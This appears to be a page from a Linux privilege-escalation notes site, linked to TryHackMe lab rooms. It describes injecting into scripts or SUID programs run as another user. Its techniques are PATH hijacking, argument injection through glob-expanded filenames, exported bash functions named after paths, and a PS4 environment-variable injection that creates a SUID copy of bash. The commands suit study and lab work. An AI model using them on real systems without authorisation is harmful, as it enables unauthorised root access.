# Injection

<div class="row row-cols-md-2"><div>

If there is some code that can is executed as another user, for instance, a [scheduled task](tasks.md) or a [program with the SUID bit](perms.md#suidguid-bit), you may be able to modify the code behavior.

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment, meaning:

* 🌸 edit the environment variables
* 🌿 edit the files used by the program
* 🎭 create a file named after the parameters of the command. For instance, if the code uses a glob-pattern, the pattern will be replaced with the matching files. So, you may inject parameters.
* 🐦 use a flaw in the script language
* ...
</div><div>
</div></div>

<hr class="sep-both">

## Environment variables 🌸

<div class="row row-cols-md-2"><div>

#### PATH

[![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)

If a script uses the command `ls` and the environment variable `PATH` with the value `/tmp:[...]`, as you can write in `/tmp`, you can create an executable named `ls` which is actually a `bash`. 

When the target script is executed, the `bash` command is executed instead of `ls`.

➡️ If you are the one running the script, you can also change your own PATH to avoid loading the original binary.
</div><div>
</div></div>

<hr class="sep-both">

## Parameters injection  🎭

[![linuxstrengthtraining](../../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)

<div class="row row-cols-md-2"><div>

To execute any command with filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.

We can inject arguments when [glob-patterns](/operating-systems/linux/knowledge/index.md#glob-patterns) are replaced.
</div><div>

For instance, to inject `-la` into `ls`:

```shell!
$ touch -- -la
$ ls
-la
$ ls * # * was replaced by -la
total 8
drwxr-xr-x 2 xxx xxx 4096 Apr 29 18:50 .
drwxr-xr-x 9 xxx xxx 4096 Apr 29 18:50 ..
-rw-r--r-- 1 xxx xxx    0 Apr 29 18:50 -la
```

</div></div>

<hr class="sep-both">

## Bash scripts failures 🐦

<div class="row row-cols-md-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>